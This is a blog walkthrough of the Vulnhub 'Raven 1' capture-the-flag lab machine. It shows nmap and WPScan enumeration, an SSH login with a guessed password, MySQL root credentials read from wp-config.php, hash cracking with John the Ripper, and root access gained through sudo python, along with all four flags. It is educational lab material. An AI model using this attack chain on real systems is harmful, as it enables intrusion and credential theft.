<?php 
$basedir = '../../';
include($basedir.'includes/header.php'); 
?> 

      <section>

      <div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
</span></code></pre></div></div>

<div style="width:100%;height:0;padding-bottom:96%;position:relative;"><iframe src="https://giphy.com/embed/3oz8xQ6746bq8fjBBu" width="100%" height="100%" style="position:absolute" frameBorder="0" class="giphy-embed" allowFullScreen></iframe></div><p><a href="https://giphy.com/gifs/3oz8xQ6746bq8fjBBu"></a></p>
<h1 id="ctflearn">Raven 1 CTF</h1>
<p>
Raven is a beginner to intermediate vulnerable machine from the repository of <a href="https://www.vulnhub.com/">Vulnhub</a>.
In this article, we will explore this machine's vulnerabilities and find the 4 hidden flags.
</p>

<h3>Resources required:</h3>
<ul>
  <li><a href="https://www.vmware.com/ca/products/workstation-pro/workstation-pro-evaluation.html">VMWare Workstation (or any virtualization software)</a></li>
  <li><a href="https://www.kali.org/get-kali/">Kali Linux VM (my preferred security testing OS)</a></li>
  <li><a href="https://www.vulnhub.com/entry/raven-1,256/">Raven 1 VM</a></li>
</ul>
<h3>Topology:</h3>
<p><img src="https://user-images.githubusercontent.com/59718043/125230228-690f7000-e2a6-11eb-9858-a09c75b6140e.png" alt="kali linux raven topology" /></p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Raven 1
Debian GNU/Linux 8 Raven tty1
Raven login: 
</span></code></pre></div></div>

<p>
    Assuming that you have already gone through the process of installing and configuring both VMs, we're going to dive right into
it.
<br/><br/>
Our isolated network address is 172.16.101.0/24. We can run a ping scan to determine which
hosts are active.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nmap -v -sP 172.16.101.0/24 
</span></code></pre></div></div>
<p><b>-sP</b> - Ping scan</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
Nmap scan report for 172.16.101.128
Host is up (0.00012s latency).
Nmap scan report for 172.16.101.129 
</span></code></pre></div></div>

<p>Here we have mapped out 2 active hosts. (Kali and Raven)
<br/><br/>
Raven's IP address: <b>172.16.101.129</b> 
</p>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Kali Linux</th>
<th>Raven</th>
</tr>
</thead>
<tbody>
<tr>
<td>172.16.101.128</td>
<td>172.16.101.129</td>
</tr>
</tbody>
</table>
<p>
At this point, we should run an nmap to see what we're dealing with.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nmap -v -A 172.16.101.129
</span></code></pre></div></div>
<p>
<b>-A</b> - enables OS detection, version detection, script scanning, and traceroute.    
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
PORT    STATE  SERVICE   VERSION
22/tcp  open   ssh       OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
80/tcp  open   http      Apache httpd 2.4.10 ((Debian))
111/tcp open   rpcbind   2-4 (RPC #100000)
</span></code></pre></div></div>

<p>Right off the bat we get a hint, as we can see on the output, Apache is running
an HTTP site that we should check out.
<br/><br/>
We can open up a browser and type in Raven's address, in my case it's 172.16.101.129.
</p>



<br/><br/>
<h1>Flag #1 - Source code analysis</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126024577-9e30a8f8-14d8-4e3b-86f0-c3d01815df85.jpg" alt="source code analysis" /></p>
<p>
While searching for hard-coded hints within the site's source code, I found the first flag
hidden in <b>service.html</b>.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Source-code flag:
&#8249;!-- End footer Area -->
&#8249;!-- flag1{b9bbcb33e11b80be759c4e844862482d} -->
</span></code></pre></div></div>

<p>Flag #1: <b>b9bbcb33e11b80be759c4e844862482d</b>
<br/><br/>

<h3>Web app scanning</h3>
The next best move, to search for the next flag, is to scan the site for
any bugs or vulnerabilities. We're going to use <a href="https://cirt.net/Nikto2">Nikto</a>, an open-source
web server vulnerability scanner.
<br/></br>
Run a Nikto scan:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nikto -h 172.16.101.129
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
+ Allowed HTTP Methods: POST, OPTIONS, GET, HEAD
+ OSVDB-3268: /css/: Directory indexing found.
+ OSVDB-3092: /css/: This might be interesting ...
+ OSVDB-3268: /img/: Directory indexing found.
+ OSVDB-3092: /img/: This might be interesting ...
+ OSVDB-3092: /manual/: Web server manual found.
+ OSVDB-3268: /manual/images/: Directory indexing found.
+ OSVDB-6694: /.DS_Store: Apache on Mac OSX will serve the .DS_Store file,
which contains sensitive information. COnfigure Apache to ignore this file
or upgrade to a newer version.
+ OSVDB-3233: /icons/README: Apache default file found.
</span></code></pre></div></div>

<p>Unfortunately, there is nothing interesting in the output.
We could run a <a href="https://wpscan.com/wordpress-security-scanner">WPScan</a> just in case a WordPress directory
exists on the server.
<br/></br>
WPScan is a free CLI tool for scanning WordPress sites for vulnerabilities.  
<br></br>
Run WPScan:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">wpscan --url http://172.16.101.129/ --enumerate vp,vt,u
</span></code></pre></div></div>

<p>
The <b>--url</b> option specifies the target URL.
<br/><br/>
The <b>--enumerate</b> option specifies the types of enumeration processes: <b>vp</b>, <b>vt</b>, and
<b>u</b>.
<br/><br/>
<b>vp</b> - Scan for vulnerable plugins.
<br/><br/>
<b>vt</b> - Scan for vulnerable themes.
<br/><br/>
<b>u</b> - Scan for a range of user IDs.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
_______________________________________________________
    __          _______   _____
    \ \        / /  __ \ / ____|
     \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
      \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
       \  /\  /  | |     ____) | (__| (_| | | | |
        \/  \/   |_|    |_____/ \___|\__,_|_| |_|

    WordPress Security Scanner by the WPScan Team
                   Version 3.5.3
      Sponsored by Sucuri - https://sucuri.net
  @_WPScan_, @ethicalhack3r, @erwan_lr, @_FireFart_
_______________________________________________________
Scan Aborted: The remote website is up, but does not seem to be running
WordPress.
</span></code></pre></div></div>

<p>The server does not seem to be running WordPress. We should check thoroughly
by appending <b>/wordpress/</b> to the URL.
<br/><br/>
It turns out that the wp-content on this site is custom, that's why it wasn't detected by our initial scan. Appending <b>/wordpress/</b> returns
a WordPress admin login page.
<br/><br/>
We can go back to our terminal and try running a WPScan again, only this time
we need to add the WordPress directory.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">wpscan --url http://172.16.101.129/wordpress/ --wp-content-dir -ep -et -eu
</span></code></pre></div></div>

<p>
<b>--wp-content-dir</b> - Since the wp-content is custom, we need to explicitly
redirect the scan.
<br/><br/>
<b>-ep</b> - Enumerate plugins.
<br/><br/>
<b>-et</b> - Enumerate themes.
<br/><br/>
<b>-eu</b> - Enumerate users.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
[1] User(s) Identified:
[+] michael
    Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    Confirmed By: Login Error Messages (Aggressive Detection)

[+] steven
    Found By: Author Id Brute Forcing - Author Pattern (Aggressive Detection)
    Confirmed By: Login Error Messages (Aggressive Detection)
</span></code></pre></div></div>
<br/><br/>
<h1>Flag #2 - Exploiting an open SSH port</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126024684-626ef2ec-e188-4918-a0a9-d3ed1a3bde93.jpg" alt="direct acces to backdoor" /></p>
<p>
It looks like we found 2 valid usernames. We can use these to SSH into 
the server. When we executed an <b>nmap</b> scan earlier, we found an open
SSH port.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">22/tcp  open  ssh   OpenSSH 6.7p1 Debian 5+deb8u4 (protocol 2.0)
</span></code></pre></div></div>

<p>We should be able to SSH using one of the usernames we acquired:</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">ssh steven@172.16.101.129
</span></code></pre></div></div>
<p>OR</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">ssh michael@172.16.101.129
</span></code></pre></div></div>
<p>
After a few unsuccessful attempts to log into Steven's account, I tried logging into Michael's.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">ssh michael@172.16.101.129
michael@172.16.101.129's password:

This program included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Tue Jun 1 04:12:08 2021 from 172.16.101.1
michael@Raven:~$
</span></code></pre></div></div>

<h3>Weak password = disappointment</h3>
<p><img src="https://user-images.githubusercontent.com/59718043/126024775-d00ad734-26f9-4dd0-8f7f-2aac571d7396.jpg" alt="disappointed" /></p>

<p>The password I used was 'michael'. This opens a connection remotely,
now we can safely assume that the second flag should be in here somewhere.
</p>


<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">find /-iname *flag*
</span></code></pre></div></div>

<p>
The flag can be found hidden in <b>/var/www/</b>.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">/var/www/flag2.txt
</span></code></pre></div></div>
<p>
Display the contents of flag2.txt:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">cat /var/www/flag2.txt
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
flag2{fc3fd58dcdad9ab23faca6e9a36e581c}
</span></code></pre></div></div>

<p>Flag #2: <b>fc3fd58dcdad9ab23faca6e9a36e581c</b></p>

<br/><br/>

<h1>Misconfigured MySQL settings</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126024873-d34cb26b-0166-4963-8cf8-c8c33bd2ea3a.jpg" alt="misconfigured database" /></p>


<p>Navigating into <b>/var/www/</b>, we can find a wordpress directory.</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">michael@Raven:/var/www/html/wordpress$ ls
index.php        wp-blog-header.php    wp-cron.php        wp-mail.php
license.txt      wp-comments-post.php  wp-includes        wp-settings.php
readme.html      wp-config.php         wp-links-opml.php  wp-signup.php
wp-activate.php  wp-config-sample.php  wp-load.php        wp-trackback.php
wp-admin         wp-content            wp-login.php       xmlrpc.php
</span></code></pre></div></div>

<p>This directory contains <b>wp-config.php</b>, which itself contains the base
configuration for WordPress.</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">nano wp-config.php  
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
// ** MySQL settings - You can get this info from your web host ** //
/** The name of the database for WordPress */
define('DB_NAME', 'wordpress');

/** MySQL database username */
define('DB_USER', 'root');

/** MySQL database password */
define('DB_PASSWORD', 'R@v3nSecurity');

/** MySQL hostname */
define('DB_HOST', 'localhost');

/** Database Charset to use  in creating database tables. */
define('DB_CHARSET', 'utf8mb4');

/** The Database Colalte type. Don't change this if in doubt. */
define('DB_COLLATE', '');
</span></code></pre></div></div>
<p>
MySQL username: <b>root</b>
</p>
<p>MySQL password: <b>R@v3nSecurity</b></p>
<p>We can use these credentials to log into MySQL:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mysql -u root -p
</span></code></pre></div></div>

<p>
<b>-u</b> - Specifies the username.
<br/><br/>
<b>-p</b> - We will be prompted for password input.
</p>


<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
Enter password:
Welcome to the MySQL monitor. Commands end with ; or \g.
Your MySQL connection id is 39
Server version: 5.5.60-0+deb8u1 (Debian)

Copyright (c) 2000, 2018, Oracle and/or its affiliates. All rights reserved.

Oracle is a registered trademark of Oracle Corporation and/or its
affiliates. Other names may be trademarks of their respective
owners.

Type 'help;' or '\h' for help. Type '\c' to clear the current input statement.

mysql>
</span></code></pre></div></div>

<p>This output shows our successful attempt to log into the database
with the stolen credentials.
<br/><br/>
We can list the available databases:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| mysql              |
| performance_schema |
| wordpress          |
+--------------------+
4 rows in set (0.03 sec)
</span></code></pre></div></div>

<p>
The database that we're going to check out is <b>wordpress</b>.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mysql> use wordpress;
Reading table information for completion of table and column names
You can turn off this feature to get a quicker startup with -A

Database changed
mysql>
</span></code></pre></div></div>

<p>From here, we can display the available tables within this database:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">mysql> show tables;
+-----------------------+
| Tables_in_wordpress   |
+-----------------------+
| wp_commentmeta        |
| wp_comments           |
| wp_links              | 
| wp_options            |
| wp_postmeta           |
| wp_posts              |
| wp_term_relationships |
| wp_term_taxonomy      |
| wp_termmeta           |
| wp_terms              |
| wp_usermeta           |
| wp_users              |
+-----------------------+
12 rows in set (0.00 sec)
</span></code></pre></div></div>

<p>
At this point, we can display the output from <b>wp_users</b>:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">select * from wp_users;
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
1 | michael | P$BjRvZQ.VQcGZlDeiKToCQd.cPw5XCe0  | michael@raven.org
2 | steven  | $P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/ | steven@raven.org 
</span></code></pre></div></div>

<p>It looks like we have encoded passwords. We already have Michael's 
password, so now we only need to worry about decrypting Steven's.
</p>
<br/><br/>
<h1>Cracking Steven's password - John the Ripper</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126024951-d671b0fa-a0f7-4ef5-b0df-2cc8b75fe522.jpg" alt="Password cracking" /></p>

<p><a href="https://www.openwall.com/john/">John the Ripper</a> is a password
recovery and security auditing tool. We will be using this tool to crack Steven's encoded password.
<br/><br/>
First, we need to create a text file to store the encoded password in:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">echo "$P$Bk3VD9jsxx/loJoqNsURgHiaB23j7W/" > hash.txt
</span></code></pre></div></div>
<p>Run John the Ripper on our text file:</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">john hash.txt
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
Using default input encoding: UTF-8
Loaded 1 password hash (phpass [phpass ($P$ or $H$) 256/256 AVX2 8x3])
Cost 1 (iteration count) is 8192 for all loaded hashes
Will run 2 OpenMP threads
Proceeding with single, rules:Single
Press 'q' or Ctrl+C to abort, almost any other key for status
Almost done: Processing the remaining buffered candidate passwords, if any.
Proceeding with wordlist:/usr/share/john/password.lst, rules:Wordlist
Proceeding with incremental:ASCII
pink84
1g 0.00.02:21 DONE 3/3 (2021-05-31 17:38) 0.007088g/s 26220p/s 26220c/s 26220C/s
posups..pingar
Use the "--show --format=phpass" options to display all of the cracked passwords
reliably
Session completed
</span></code></pre></div></div>

<p>After successfully cracking the encrypted password inside <b>hash.txt</b>,
we can display the result:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">john --show hash.txt
?:pink84

1 password hash cracked, 0 left
</span></code></pre></div></div>

<p>
We have successfully decoded Steven's password, which we can then use to log in
through SSH.
<br/><br/>
Steven's password: <b>pink84</b>
</p>

<br/><br/>
<h1>Flag #4 - Gaining root access</h1>
<p><img src="https://user-images.githubusercontent.com/59718043/126025183-87a0d5df-7250-4400-a5e3-f4218e6daef3.jpg" alt="root access hacker hacked" /></p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">ssh steven@localhost
steven@localhost's password:

This program included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
You have new mail.
Last login: Mon Aug 13 14:12:04 2018
$
</span></code></pre></div></div>

<p>
The next best move would be to spawn a fully interactive shell. We can use
Python for this step:
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">$ python -c 'import pty;pty.spawn("bin/bash")'
steven@Raven:~$
</span></code></pre></div></div>

<p>
After spending some time looking for entry points, I decided to check out
Steven's sudo privileges:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">sudo -l
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
User steven may run the following commands on raven:
    (ALL) NOPASSWD: /usr/bin/python
</span></code></pre></div></div>

<p>
It turns out that we can use the same script to gain root access. Let's run the
script again, but this time with sudo:
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">steven@Raven:~$ sudo python -c 'import pty;pty.spawn("/bin/bash")'
root@Raven:~# 
</span></code></pre></div></div>

<p>
We finally have root access. We should be able to find a flag in here somewhere.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">root@Raven:~# ls
flag4.txt
</span></code></pre></div></div>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">root@Raven:~# cat flag4.txt
flag4{715dea6c055b9fe3337544932f2941ce}

CONGRATULATIONS on successfully rooting Raven!
</span></code></pre></div></div>

<p>Flag #4: <b>715dea6c055b9fe3337544932f2941ce</b></p>

<br/><br/>
<h1>Flag #3 - Misconfigured wp_posts</h1>
<p>Searching for flag #3, I tried running <b>find / -iname *flag*</b>
but didn't find anything worth investigating. I also tried logging into the WordPress page
with some of the credentials we have but the connection fails every time.
<br/><br/>
We're going to approach this with <a href="https://infosecjohn.blog/posts/vulnhub-raven/">John Svazic's</a>
method, which is to analyse the databases more in-depth.
<br/><br/>
In our <b>wordpress</b> database, while logged in as <b>root</b> in MySQL,
there is a table that contains our 3rd flag, hidden in plain sight.
<br/><br/>
The table we're going to explore is <b>wp_posts</b>.
</p>
<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">select * from wp_posts where post_status != 'publish'\G
</span></code></pre></div></div>

<p>
This query selects any output from the table with the <b>post_status</b> field that 
isn't set to <b>publish</b>. Essentially this takes any page-related data that wasn't published.
</p>

<div class="language-sh highlighter-rouge">
<div class="highlight"><pre class="highlight">
<code><span class="c1">Output:
ID: 4
post_author: 1
post_date: 2018-08-13 01:48:31
post_date_gmt: 0000-00-00 00:00:00
post_content: flag3{afc01ab56b50591e7dccf93122770cd2}
post_title: flag3
post_excerpt:
post_status: draft
</span></code></pre></div></div>

<p>Flag #3: <b>afc01ab56b50591e7dccf93122770cd2</b>
<br/><br/>
That's it! We have all 4 flags. We have successfully owned Raven.
</p>
<p><img src="https://user-images.githubusercontent.com/59718043/126025334-bd226787-4374-4c87-bf63-a945131a9b8c.jpg" alt="game over" /></p>

<h1>Sources</h1>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Subject</th>
<th>Link</th>
</tr>
</thead>
<tbody>
<tr>
<td>Raven VM</td>
<td><a href="https://www.vulnhub.com/entry/raven-1,256/">Vulnhub</a></td>
</tr>
<tr>
<td>Kali Linux VM</td>
<td><a href="https://www.offensive-security.com/kali-linux-vm-vmware-virtualbox-image-download/">Offensive-Security</a></td>
</tr>
<tr>
<td>Raven Walthrough</td>
<td><a href="https://resources.infosecinstitute.com/topic/raven-1-ctf-walkthrough/">Nikhil Kumar</a></td>
</tr>
<tr>
<td>Raven Walkthrough</td>
<td><a href="https://www.hackingarticles.in/hack-the-raven-walkthrough-ctf-challenge/">Raj Chandel</a></td>
</tr>
<tr>
<td>Raven Walkthrough</td>
<td><a href="https://infosecjohn.blog/posts/vulnhub-raven/">John Svazic</a></td>
</tr>
<tr>
<td>WPScan Cheat Sheet Poster</td>
<td><a href="https://blog.wpscan.com/wpscan/cheatsheet/poster/2019/11/05/wpscan-cli-cheat-sheet-poster.html">WPScan</a></td>
</tr>
<tr>
<td>John the Ripper</td>
<td><a href="https://www.openwall.com/john/">Openwall</a></td>
</tr>
</tbody>
</table>

<table class="table table-striped table-bordered">
<thead>
<tr>
<th>Media</th>
</tr>
</thead>
<tbody>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/source-code">Source Code Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://lucid.app/">Topology diagram via Lucid</a></td>
</tr>
<tr>
<td><a href="https://giphy.com/gifs/3oz8xQ6746bq8fjBBu">Type Hacker GIF by Nishanth Sanjay via GIPHY</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/cartoon">Cartoon Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/disappointment">Disappointment Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/database">Database Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/abstract">Abstract Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/hacked">Hacked Vectors by Vecteezy</a></td>
</tr>
<tr>
<td><a href="https://www.vecteezy.com/free-vector/game-over">Game Over Vectors by Vecteezy</a></td>
</tr>
</tbody>
</table>
<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c1">## @Author: Sean Bachiller
## @Date: Jul 12 2021
</span></code></pre></div></div>

<div class="page-nav">
<a href="/index.php" class="previous round">&#8249;Home</a>
<!--<a href="#" class="next round">Next&#8250;</a>-->
</div>

      </section>
<?php 
$basedir = '../../';
include($basedir.'includes/footer.php'); 
?> 
